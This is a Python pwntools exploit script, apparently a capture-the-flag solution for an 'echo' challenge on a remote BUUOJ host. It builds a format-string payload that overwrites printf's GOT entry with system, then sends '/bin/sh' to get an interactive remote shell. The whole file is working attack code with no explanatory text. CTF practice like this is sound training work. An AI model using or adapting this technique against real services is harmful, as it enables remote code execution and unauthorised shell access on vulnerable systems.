from pwn import *


# p = process("./echo")
p = remote("node4.buuoj.cn", 28555)
pro = ELF("./echo")


offset = 7
system = pro.plt["system"]
printf_g = pro.got["printf"]

fmt = fmtstr_payload(offset=7, writes={printf_g:system})
p.sendline(fmt)
p.sendline("/bin/sh\x00")

p.interactive()


